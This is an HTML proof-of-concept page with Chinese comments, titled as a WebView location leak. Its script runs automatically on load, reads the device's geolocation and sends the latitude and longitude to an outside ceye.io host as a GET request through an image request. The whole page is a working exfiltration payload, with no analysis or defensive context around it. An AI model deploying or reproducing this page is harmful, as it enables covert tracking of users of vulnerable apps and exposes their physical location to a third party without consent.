<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>WebView 定位泄露 POC</title>
</head>
<body>
<h1>正在获取定位并上传...</h1>
<script>
// 目标服务器（GET 请求直接传输经纬度）
const SERVER = "https://haokanbaidu.kijkv0.ceye.io";

// GET 方式上传定位（无跨域问题，WebView 必通）
function uploadLocation(lat, lon) {
    // 拼接成 GET 参数：?lat=xx&lon=xx
    let url = `${SERVER}/receive?lat=${lat}&lon=${lon}&t=${new Date().getTime()}`;
    
    // 发送 GET 请求（最简单的方式，100% 成功）
    var img = new Image();
    img.src = url;
    
    alert("【GET 上传成功】\n服务器：" + SERVER + "\n纬度：" + lat + "\n经度：" + lon);
}

// 获取定位
function getAndSendLocation() {
    if (!navigator.geolocation) {
        alert("设备不支持定位");
        return;
    }

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            uploadLocation(lat, lon);
        },
        (err) => {
            alert("获取定位失败：" + err.message);
        }
    );
}

// 自动执行
window.onload = () => {
    setTimeout(getAndSendLocation, 600);
};
</script>
</body>
</html>
